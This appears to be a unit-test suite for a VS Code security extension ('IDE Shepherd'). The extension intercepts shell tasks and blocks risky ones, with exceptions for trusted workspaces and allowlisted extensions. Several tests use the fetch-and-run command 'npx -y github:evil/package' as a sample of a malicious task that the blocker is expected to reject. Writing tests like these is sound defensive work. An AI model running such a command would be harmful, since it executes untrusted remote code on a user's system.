import * as vscode from 'vscode';
import { expect, use } from 'chai';
const sinon = require('sinon');
const sinonChai = require('sinon-chai');

use(sinonChai);

import {
  patchVscodeTasks,
  resolveExtensionIdFromTaskSource,
} from '../../monitor/instrumentations/vscode-tasks-instrument';
import { TrustedWorkspaceService } from '../../lib/services/trusted-workspace-service';
import { AllowListService } from '../../lib/services/allowlist-service';
import { IDEStatusService } from '../../lib/services/ide-status-service';
import { NotificationService } from '../../lib/services/notification-service';
import { Logger } from '../../lib/logger';

// Minimal vscode mock for patchVscodeTasks. Each test gets a fresh one so the
// non-configurable __tasksPatched__ flag doesn't bleed between tests.
function createMockVsCode(extensions: any[] = []) {
  const executeTaskStub = sinon.stub().resolves({ task: {} });
  return {
    tasks: { executeTask: executeTaskStub },
    workspace: { name: 'test-workspace', workspaceFolders: [{ uri: { fsPath: '/mock/workspace' } }] },
    extensions: { all: extensions },
    // expose stub for assertions
    _stub: executeTaskStub,
  };
}

function makeShellTask(commandLine: string, source = 'Workspace'): any {
  return {
    name: 'test-task',
    source,
    definition: { type: 'shell' },
    execution: new vscode.ShellExecution(commandLine),
  };
}

suite('vscode-tasks-instrument', () => {
  let trustedWorkspaceStub: any;
  let allowListStub: any;
  let emitSecurityEventStub: any;
  let showBlockingInfoStub: any;

  setup(() => {
    trustedWorkspaceStub = sinon
      .stub(TrustedWorkspaceService, 'getInstance')
      .returns({ isTrusted: sinon.stub().returns(false) } as any);

    allowListStub = sinon
      .stub(AllowListService, 'getInstance')
      .returns({ isAllowed: sinon.stub().returns(false) } as any);

    emitSecurityEventStub = sinon.stub(IDEStatusService, 'emitSecurityEvent').resolves();
    showBlockingInfoStub = sinon.stub(NotificationService, 'showSecurityBlockingInfo').resolves();
    sinon.stub(Logger, 'warn');
    sinon.stub(Logger, 'error');
    sinon.stub(Logger, 'info');
  });

  teardown(() => sinon.restore());

  // ── resolveExtensionIdFromTaskSource ──────────────────────────────────────

  suite('resolveExtensionIdFromTaskSource', () => {
    test('returns extension ID when contributes.taskDefinitions has a matching type', () => {
      const mockVsCode = createMockVsCode([
        { id: 'nrwl.angular-console', packageJSON: { contributes: { taskDefinitions: [{ type: 'nx' }] } } },
      ]);

      const result = resolveExtensionIdFromTaskSource('nx', mockVsCode as any);

      expect(result).to.equal('nrwl.angular-console');
    });

    test('falls back to raw source string when no extension matches', () => {
      const mockVsCode = createMockVsCode([
        { id: 'some.other-extension', packageJSON: { contributes: { taskDefinitions: [{ type: 'gulp' }] } } },
      ]);

      const result = resolveExtensionIdFromTaskSource('nx', mockVsCode as any);

      expect(result).to.equal('nx');
    });

    test('handles extensions with no contributes field without throwing', () => {
      const mockVsCode = createMockVsCode([{ id: 'bare.extension', packageJSON: {} }]);

      expect(() => resolveExtensionIdFromTaskSource('nx', mockVsCode as any)).to.not.throw();
    });

    test('handles extensions with non-array taskDefinitions without throwing', () => {
      const mockVsCode = createMockVsCode([
        { id: 'odd.extension', packageJSON: { contributes: { taskDefinitions: null } } },
      ]);

      expect(() => resolveExtensionIdFromTaskSource('nx', mockVsCode as any)).to.not.throw();
    });
  });

  // ── patchVscodeTasks ──────────────────────────────────────────────────────

  suite('patchVscodeTasks', () => {
    test('does not patch twice — __tasksPatched__ guard is respected', () => {
      const mockVsCode = createMockVsCode();
      patchVscodeTasks(mockVsCode as any);

      const firstPatchedFn = mockVsCode.tasks.executeTask;
      patchVscodeTasks(mockVsCode as any); // second call — should be a no-op

      expect(mockVsCode.tasks.executeTask).to.equal(firstPatchedFn);
    });

    test('passes benign commands through to the original executeTask', async () => {
      const mockVsCode = createMockVsCode();
      patchVscodeTasks(mockVsCode as any);

      const task = makeShellTask('npm install');
      await mockVsCode.tasks.executeTask(task);

      expect(mockVsCode._stub).to.have.been.calledOnce;
      expect(emitSecurityEventStub).to.not.have.been.called;
    });

    test('passes through when task has no execution', async () => {
      const mockVsCode = createMockVsCode();
      patchVscodeTasks(mockVsCode as any);

      const task = { name: 'empty', source: 'Workspace', definition: { type: 'shell' }, execution: null };
      await mockVsCode.tasks.executeTask(task);

      expect(mockVsCode._stub).to.have.been.calledOnce;
    });

    test('rejects with a blocked error for a matching command', async () => {
      const mockVsCode = createMockVsCode();
      patchVscodeTasks(mockVsCode as any);

      const task = makeShellTask('npx -y github:evil/package');

      let caught: Error | undefined;
      try {
        await mockVsCode.tasks.executeTask(task);
      } catch (err) {
        caught = err as Error;
      }

      expect(caught).to.exist;
      expect(caught!.message).to.match(/Task blocked by IDE Shepherd/);
      expect(mockVsCode._stub).to.not.have.been.called;
    });

    test('emits a security event and shows notification when blocking', async () => {
      const mockVsCode = createMockVsCode();
      patchVscodeTasks(mockVsCode as any);

      const task = makeShellTask('npx --yes github:evil/package');
      await mockVsCode.tasks.executeTask(task).catch(() => {});

      expect(emitSecurityEventStub).to.have.been.calledOnce;
      expect(showBlockingInfoStub).to.have.been.calledOnce;
    });

    test('skips blocking for trusted workspaces', async () => {
      (TrustedWorkspaceService.getInstance() as any).isTrusted.returns(true);

      const mockVsCode = createMockVsCode();
      patchVscodeTasks(mockVsCode as any);

      const task = makeShellTask('npx -y github:evil/package');
      await mockVsCode.tasks.executeTask(task);

      expect(mockVsCode._stub).to.have.been.calledOnce;
      expect(emitSecurityEventStub).to.not.have.been.called;
    });

    test('skips blocking for allowlisted extensions', async () => {
      (AllowListService.getInstance() as any).isAllowed.returns(true);

      const mockVsCode = createMockVsCode([
        { id: 'nrwl.angular-console', packageJSON: { contributes: { taskDefinitions: [{ type: 'nx' }] } } },
      ]);
      patchVscodeTasks(mockVsCode as any);

      const task = makeShellTask('npx -y github:evil/package', 'nx');
      await mockVsCode.tasks.executeTask(task);

      expect(mockVsCode._stub).to.have.been.calledOnce;
      expect(emitSecurityEventStub).to.not.have.been.called;
    });

    test('sets callerExtension.id to the resolved extension ID for extension-sourced tasks', async () => {
      const mockVsCode = createMockVsCode([
        { id: 'nrwl.angular-console', packageJSON: { contributes: { taskDefinitions: [{ type: 'nx' }] } } },
      ]);
      patchVscodeTasks(mockVsCode as any);

      const task = makeShellTask('npx -y github:evil/package', 'nx');
      await mockVsCode.tasks.executeTask(task).catch(() => {});

      const secEvent = emitSecurityEventStub.firstCall.args[0];
      expect(secEvent.callerExtension).to.exist;
      expect(secEvent.callerExtension.id).to.equal('nrwl.angular-console');
    });

    test('does not set callerExtension for workspace-sourced tasks', async () => {
      const mockVsCode = createMockVsCode();
      patchVscodeTasks(mockVsCode as any);

      const task = makeShellTask('npx -y github:evil/package', 'Workspace');
      await mockVsCode.tasks.executeTask(task).catch(() => {});

      const secEvent = emitSecurityEventStub.firstCall.args[0];
      expect(secEvent.callerExtension).to.be.undefined;
    });
  });
});
